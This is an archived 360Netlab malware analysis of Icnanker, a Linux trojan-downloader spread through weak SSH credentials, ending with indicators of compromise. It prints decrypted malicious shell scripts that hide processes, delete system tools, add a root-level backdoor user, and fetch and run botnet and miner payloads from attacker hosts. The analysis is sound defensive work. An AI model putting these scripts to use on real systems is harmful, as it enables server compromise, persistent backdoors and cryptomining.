{
    "id": "6594dc6e-6f8f-4d6e-a265-7d2dddb84a04",
    "created_at": "2023-01-12T15:09:33.423096Z",
    "updated_at": "2025-03-27T02:09:08.024838Z",
    "deleted_at": null,
    "sha1_hash": "fb6303a0895e93c90afce4201750430d73e7c014",
    "title": "2020-03-23 - Icnanker, a Linux Trojan-Downloader Protected by SHC",
    "authors": "",
    "file_creation_date": "2022-05-29T00:55:32Z",
    "file_modification_date": "2022-05-29T00:55:32Z",
    "file_size": 349666,
    "plain_text": "# Icnanker, a Linux Trojan-Downloader Protected by SHC\n\n**blog.netlab.360.com/icnanker-trojan-downloader-shc-en/**\n\nAlex.Turing March 23, 2020\n\n#### 23 March 2020 / Icnanker\n\n## Background\n\n#### On August 15, 2019, 360Netlab Threat Detecting System flagged an unknown ELF sample (5790dedae465994d179c63782e51bac1) which generated Elknot Botnet related network traffic. We manually took a look and noticed that it is a Trojan-Downloader which utilizes \"SHC (Shell script compiler)\" technique and propgrates through weak SSH credentials. The author appeared to be an old player Icnanker. Icnanker was exposed on the Internet in 2015 as a script programmer, who has a high-profile personality and likes to leave his QQ number and name in his codes. The sample, in our opinion, was not much new and therefore we did not bother to write anything.\n\n On March 12, 2020, IntezerLab twittered about a Icnanker variant (6abe83ee8481b5ce0894d837eabb41df). They did not give much details and we figured it is probably worth writing down a few interesting features that we observed.\n\n## Overview\n\n#### Icnanker is the first Linux malware family we observed that uses SHC. Its name is derived from the author's ID \"by icnanker\" in the script.\n\n The current Icnanker samples can be divided into 2 categories according to their functions:\n\n Protector\n Protector is used to protect samples from being deleted. It is currently used to protect Mining service.\n\n Downloader\n Downloader is mainly used to facilitate DDos and Mining attacks. Currently its samples include Elknot Botnet, Xor Botnet and XMRMiner. On Icnanker-related HFS servers, we can see that the current download volume is at 20,114, and about 500 increment per day.\n\n The main functions of Downloader are:\n\n\n-----\n\n#### Persistence\n\n Hide itself\n\n Delete system command\n\n Add new users\n\n Download and execute specific samples\n\n## Reverse analysis\n\n#### Let's take a look at the following two samples.\n 187fa428ed44f006df0c8232be4a6e4e Miner Protector,\n 5790dedae465994d179c63782e51bac1 Elknot Botnet Downloader.\n\n MD5:5790dedae465994d179c63782e51bac1\n\n ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=8368ecf43c311327ed1b8e011f25b87ceef7f065, stripped\n\n Packer: No\n\n Verdict:Malicious,Downloader\n\n 187fa428ed44f006df0c8232be4a6e4e\n ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, stripped\n\n Packer:No\n\n Verdict:Malicious,Protector\n\n We know on the Windows platform, there is a technology for packaging BAT scripts into executable files, which is called Bat2Exe. Similarly, on the Linux platform,there is an open source \"SHC (Shell script compiler)\" that packs shell scripts into executable files. SHC uses the RC4 algorithm to encrypt the original script. The ELF file generated by it has very obvious characteristics: the RC4 decryption function is called a total of 14 times,and there are many unique strings. Security researchers can tell fairly easily whether ELF is generated by SHC.\n\n\n-----\n\n#### As mentioned above, we can use the RC4 algorithm to manually extract the original script. (Another option is to use UnSHc to directly decrypt the script)\n```\n[*] Extracting each args address and size for the 14 arc4() calls with address [0x8048f65]...\n     [0] Working with var address at offset [0x80ed087] (0x2a bytes)\n     [1] Working with var address at offset [0x80ed0df] (0x1 bytes)\n              ...............\n     [12] Working with var address at offset [0x80f1280] (0x13 bytes)\n     [13] Working with var address at offset [0x80f12b1] (0x13 bytes)\n[*] Extracting password...\n     [+] PWD address found : [0x80f12ed]\n     [+] PWD size found : [0x100]\n[*] Executing [/tmp/kjGnQn] to decrypt [5790dedae465994d179c63782e51bac1]\n[*] Retrieving initial source code in [5790dedae465994d179c63782e51bac1.sh]\n[*] All done!\n              ...............\n[*] Executing [/tmp/GRsVsP] to decrypt [187fa428ed44f006df0c8232be4a6e4e]\n[*] Retrieving initial source code in [187fa428ed44f006df0c8232be4a6e4e.sh]\n[*] All done!\n\n### Protector (187fa428ed44f006df0c8232be4a6e4e.sh)\n\n```\n\n-----\n\n```\ncp -f /usr/bin/chattr /usr/bin/lockr\ncp -f /usr/bin/chattr /usr/bin/.locks\ncp -f /usr/bin/.locks /usr/bin/lockr\nchmod 777 /usr/bin/lockr\nchmod 777 /usr/bin/.locks\nlockr +i /usr/bin/lockr >/dev/null 2>&1\nlockr +i /usr/bin/.locks >/dev/null 2>&1\n.locks -i /usr/bin/lockr;chmod 777 /usr/bin/lockr\nlockr +i /usr/bin/lockr >/dev/null 2>&1\ncp -f /usr/bin/lsattr /usr/bin/lockrc\ncp -f /usr/bin/lsattr /usr/bin/.locksc\ncp -f /usr/bin/.locksc /usr/bin/lockrc\nchmod 777 /usr/bin/lockrc\nchmod 777 /usr/bin/.locksc\nlockr +i /usr/bin/lockrc >/dev/null 2>&1\nlockr +i /usr/bin/.locksc >/dev/null 2>&1\n.locks -i /usr/bin/lockrc;chmod 777 /usr/bin/lockrc\nlockr +i /usr/bin/lockrc >/dev/null 2>&1\nrm -rf /usr/bin/lsattr\nrm -rf /usr/bin/chattr\nlockr +a /var/spool/cron/crontabs/root\nlockr +i /var/spool/cron/crontabs/root\nlockr +a /var/spool/cron/root\nlockr +i /var/spool/cron/root\nlockr +i /usr/lib/.cache/\nlockr +i /usr/lib/.cache\nrm -f $0\n\n#### In this script, we can clearly see that the system commands chattr, lsattr are renamed and deleted, and the directory .cache, where mining script located,is protected, and the immutable attribute is enabled to prevent from being deleted.\n\n### Downloader (5790dedae465994d179c63782e51bac1.sh)\n\n```\n－－－－－－－－－－－－from 5790dedae465994d179c63782e51bac1.sh－－－－－－－－－－\n```\n        ...............\n  echo \"byicnanker 2228668564\" > $Config\n     tempfile=`cat $Config | awk '{print $1}'`\n     filetemp=\"/usr/bin/$tempfile\" #现马的路径\n     filename=`date +%s%N | md5sum | head -c 10`\n     filepath=\"/usr/bin/$filename\" #新马的路径\n     tempbash=`cat $Config | awk '{print $2}'`\n     bashtemp=\"/usr/bin/$tempbash\" #现脚本路径\n     bashname=`date +%s%N | md5sum | head -c 10`\n     bashpath=\"/usr/bin/$bashname\" #新脚本路径\n        ...............\n\n#### This section has a typical icnanker marks, we can clearly see the icnanker logo, QQ, Chinese annotations, etc.\n\n Since the script is in plain text, the functions are clear at a glance, and there are mainly 5 functions.\n\n Persistence, self-starting via re.local.\n\n```\n\n-----\n\n```\n   y\n Repeatstart=`cat /etc/rc.local | grep 'start'| wc -l`\n if [ $Repeatstart != 1 ];then\n     lockr -i /etc/rc.local;sed -i '/start/d' /etc/rc.local\n fi\n if [ -z \"`cat /etc/rc.local | grep \"$bashtemp\"`\" ]; then\n     if [ -z \"`cat /etc/rc.local | grep \"$exit0\"`\" ]; then\n          lockr -i /etc/;lockr -i /etc/rc.local\n          echo \"$bashpath start\" >> /etc/rc.local\n     else\n          lockr -i /etc/;lockr -i /etc/rc.local\n          sed -i \"s|exit 0|$bashpath start|\" /etc/rc.local\n          echo \"exit 0\">>/etc/rc.local\n     fi\n fi\n\n#### Self-hiding, so that management tools such as ss, ps, netstat cannot detect the process and network connections related to the sample.\nif [ -f /bin/ss ];then\n     if [ ! -f \"$iss\" ];then\n          if [ ! -f \"$issbak\" ];then\n              lockr -i /usr/bin/;mkdir /usr/bin/dpkgd/\n              cp -f /bin/ss $issbak\n              cp -f /bin/ss $iss\n          else\n              cp -f $issbak $iss\n          fi\n          chmod 777 $iss;chmod 777 $issbak\n          lockr +i $issbak >/dev/null 2>&1\n          lockr +i $iss >/dev/null 2>&1\n     else\n          if [ ! -f \"$issbak\" ];then\n              lockr -i /usr/bin/;cp -f $iss $issbak\n              lockr +i $issbak >/dev/null 2>&1\n          fi\n          if [ -z \"`cat /bin/ss | grep $Address`\" ]; then\n              lockr -i /bin/;lockr -i /bin/ss\n              echo '#!/bin/sh' > /bin/ss\n              echo 'iss|grep -v \"'$Address'\"' >> /bin/ss\n              echo 'exit' >> /bin/ss\n              chmod 777 /bin/ss;lockr +i /bin/ss >/dev/null 2>&1\n          fi\n     fi\nfi\n\n Delete some system files to increase the difficulty for repair.\nlockr -i /usr/bin/;\nlockr -i /usr/bin/wget;\nrm -f /usr/bin/wget;\nlockr -i /usr/bin/chattr;\nrm -f /usr/bin/chattr\n\n Add new user (ntps) to facilitate subsequent control of the victim's machine\n\n```\n\n-----\n\n```\n   y\n if [ -z \"`cat /etc/passwd|grep \"ntps\"`\" ]; then\n     lockr -i /etc/;lockr -i /etc/passwd #ntps\n     echo 'ntps:x:0:1:ntps:/root:/bin/bash' >> /etc/passwd\n     lockr -i /etc/;lockr +i /etc/passwd >/dev/null 2>&1\n fi\n if [ -z \"`cat /etc/shadow|grep \"ntps\"`\" ]; then\n     lockr -i /etc/;lockr -i /etc/shadow #tianyong\n     echo\n'ntps:$6$J6RdL6Xh$udhpd5iErOxXyZSERCi0NOtoXE9J095xDRo4DJfCoTEsImcxype6iltDL8pTG7w/7Gbp9Ohrii9O.4NnxqG/h.:1658\n >> /etc/shadow\n     lockr -i /etc/;lockr +i /etc/shadow >/dev/null 2>&1\n fi\n\n#### Download and execute specific samples, here it downloads the Elknot Botnet.\n # by icnanker ---------------------------------------------- iptable=`iptables -L INPUT | grep \"$Address\" | grep 'ACCEPT'`\n if [ -z \"$iptable\" ];then\n     iptables -I INPUT -s $Address -j ACCEPT\n else\n     iptables -D INPUT -s $Address -j DROP\n fi\n process=`ips -ef | grep \"$tempfile\" | grep -v \"grep\" | wc -l`\n if [ $process != 1 ];then\n     if [ ! -f \"$filebak\" ];then\n          lockr -i /usr/bin/;lockr -i /usr/bin/htrdpm;rm -f /usr/bin/htrdpm\n          cd /usr/bin/;dget http[://hfs.ubtv.xyz:22345/htrdpm\n          cd $path;mv -f /usr/bin/htrdpm $filepath\n     else\n          cp -f $filebak $filepath\n     fi\n     Runkillallconnect\n     chmod 777 $filepath\n     nohup $filepath >/dev/null 2>&1 &\n fi\n\n At this point, Icnanker will load itself when system boots and maintain continuously control of the victim secretly. At the same time, Icnanker has pretty flexible configuration. When migrating from one service to another, the author only needs to update the dns settings in the scripts.\n\n Take the Elknot and Miner as examples\n\n```\n\n-----\n\n```\nResolveIP=`nslookup [ddd.ubtv.xyz|grep \"Address: \"|awk '{print $2}'`\nif [ -z \"$ResolveIP\" ];then\n     lockr -i /etc/;lockr -i /etc/resolv.conf\n     echo 'nameserver 114.114.114.114' > /etc/resolv.conf\n     echo 'nameserver 8.8.8.8' >> /etc/resolv.conf\n     echo 'nameserver 8.8.4.4' >> /etc/resolv.conf\n     lockr +i /etc/resolv.conf >/dev/null 2>&1\n     service network restart;sleep 1\n     Address=`nslookup ddd.ubtv.xyz|grep \"Address: \"|awk '{print $2}'`\nelse\n     Address=\"$ResolveIP\"\nfi\n dget http[://hfs.ubtv.xyz:22345/htrdpm\n-------------------------------------------VS---------------------------------------miner\nResolveIP=`nslookup p[ool.supportxmr.com|grep \"Address: \"|awk '{print $2}'`\nif [ -z \"$ResolveIP\" ];then\n     lockr -i /etc/;lockr -i /etc/resolv.conf\n     echo 'nameserver 114.114.114.114' > /etc/resolv.conf\n     echo 'nameserver 8.8.8.8' >> /etc/resolv.conf\n     echo 'nameserver 8.8.4.4' >> /etc/resolv.conf\n     lockr +i /etc/resolv.conf >/dev/null 2>&1\n     service network restart;sleep 1\n     Address=`nslookup p[ool.supportxmr.com|grep \"Address: \"|awk '{print $2}'`\nelse\n     Address=\"$ResolveIP\"\nfi\n dget http[://xz.jave.xyz:22345/.xm\n\n#### Here is a list of Downloader and theirs services currently we observed.\n\n filename md5 payload type payload url\n\n 80 5790dedae465994d179c63782e51bac1 elknot botnet http[://hfs.ubtv.xyz:22345/htrdpm\n\n .ds1;.ds2 6abe83ee8481b5ce0894d837eabb41df miner http[://xz.jave.xyz:22345/.xm\n\n .ssh 89cd1ebfa5757dca1286fd925e0762de elknot botnet http[://hfs.ubtv.xyz:22345/htrdpm\n\n 19880 d989e81c4eb23c1e701024ed26f55849 elknot botnet http[://hfs.ubtv.xyz:22345/htrdps\n\n## Icnanker's distributed samples\n\n#### Icnanker's distributed samples are all stored on its HFS server, and from what we have seen so far, all samples are the typical botnet families: Elknot Botnet, Xor Botnet, and XMR mining service.\n\n Elknot Botnet\n\n filename md5 c2\n\n htrdps 5c90bfbae5c030da91c9054ecb3194b6 ubt.ubtv.xyz:19880, jav.jave.xyz:6001\n\n kcompact0 eec19f1639871b6e6356e7ee05db8a94 sys.jave.xyz:1764, jav.jave.xyz:6001\n\n Xor.DDoS Botnet\n\n filename md5 c2\n\n ss 0764da93868218d6ae999ed7bd66a98e 8uch.jave.xyz:3478,8uc1.jave.xyz:1987,8uc2.ubtv.xyz:2987\n\n```\n\n-----\n\n#### Miner\n\n filename md5 c2\n\n sh 17ac3bd2753b900367cb9ee4068fe0c1\n\n .xm 765a0899cb87400e8a27ab572f3cdd61\n\n## Suggestions\n\n#### We recommend that users watch for the clues we mentioned above and block the C2 on their networks,\n We also suggest strong login credentials should always be enforced.\n\n## Contact us\n\n#### Readers are always welcomed to reach us on twitter, or email to netlab at 360 dot cn.\n\n## IoC list\n\n### Sample MD5\n```\n5790dedae465994d179c63782e51bac1\n6abe83ee8481b5ce0894d837eabb41df\n89cd1ebfa5757dca1286fd925e0762de\nd989e81c4eb23c1e701024ed26f55849\n5c90bfbae5c030da91c9054ecb3194b6\neec19f1639871b6e6356e7ee05db8a94\n0764da93868218d6ae999ed7bd66a98e\n17ac3bd2753b900367cb9ee4068fe0c1\n765a0899cb87400e8a27ab572f3cdd61\n187fa428ed44f006df0c8232be4a6e4e\n\n CC\nubt.ubtv.xyz:19880 #Elknot\nsys.jave.xyz:1764 #Elknot\njav.jave.xyz:6001 #Elknot\n8uch.jave.xyz:3478 #Xor.DDoS\n8uc1.jave.xyz:1987 #Xor.DDoS\n8uc2.ubtv.xyz:2987 #Xor.DDoS\nxz.jave.xyz:22345 #Icnanker HFS\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-03-23 - Icnanker, a Linux Trojan-Downloader Protected by SHC.pdf"
    ],
    "report_names": [
        "2020-03-23 - Icnanker, a Linux Trojan-Downloader Protected by SHC.pdf"
    ],
    "threat_actors": [
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536173,
    "ts_updated_at": 1743041348,
    "ts_creation_date": 1653785732,
    "ts_modification_date": 1653785732,
    "files": {
        "pdf": "https://archive.orkl.eu/fb6303a0895e93c90afce4201750430d73e7c014.pdf",
        "text": "https://archive.orkl.eu/fb6303a0895e93c90afce4201750430d73e7c014.txt",
        "img": "https://archive.orkl.eu/fb6303a0895e93c90afce4201750430d73e7c014.jpg"
    }
}